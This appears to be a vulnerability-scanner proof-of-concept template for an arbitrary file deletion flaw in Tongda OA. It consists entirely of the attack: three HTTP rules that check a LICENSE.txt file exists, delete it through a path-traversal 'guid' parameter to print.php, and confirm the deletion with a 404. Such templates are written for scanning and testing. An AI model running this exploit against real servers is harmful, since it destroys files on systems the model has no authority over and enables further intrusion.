name: poc-yaml-tongdaoa-arbitraryfiledeletion
rules:
  - method: GET
    path: /jpush/nategood/httpful/LICENSE.txt
    follow_redirects: false
    expression: |
      response.status == 200 && response.content_type.contains("text/plain")
  - method: POST
    path: >-
      /module/appbuilder/assets/print.php?guid=../../../webroot/jpush/nategood/httpful/LICENSE.txt
    follow_redirects: true
    expression: >
      response.status == 200 && response.body.bcontains(bytes("general/appbuilder/web/download.php"))
  - method: GET
    path: >-
      /jpush/nategood/httpful/LICENSE.txt
    follow_redirects: true
    expression: |
      response.status == 404
detail:
  author: su(https://suzzz112113.github.io/#blog)
  links:
    - https://mp.weixin.qq.com/s/BSeYSop5JpM-BI6yNeyTGQ